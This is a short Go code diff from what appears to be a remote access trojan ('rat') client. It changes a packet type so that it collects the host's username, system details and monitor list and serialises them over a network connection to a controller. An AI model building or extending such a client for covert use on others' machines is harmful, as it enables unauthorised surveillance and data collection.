@@ -1,6 +1,8 @@
 package main
 
 import (
+	"encoding/gob"
+	"io"
 	"rat/client/computer"
 	"rat/client/os"
 	"rat/client/screen"
@@ -22,7 +24,7 @@ func (packet ComputerInfoPacket) Header() header.PacketHeader {
 	return header.ComputerInfoHeader
 }
 
-func (packet *ComputerInfoPacket) Init() {
+func (packet ComputerInfoPacket) Write(w io.ReadWriter, c *Connection) error {
 	u := computer.GetComputerInformation()
 
 	packet.Username = u.Username
@@ -33,4 +35,6 @@ func (packet *ComputerInfoPacket) Init() {
 	screen.QueryMonitors()
 	packet.Monitors = screen.Monitors
 
+	enc := gob.NewEncoder(w)
+	return enc.Encode(&packet)
 }
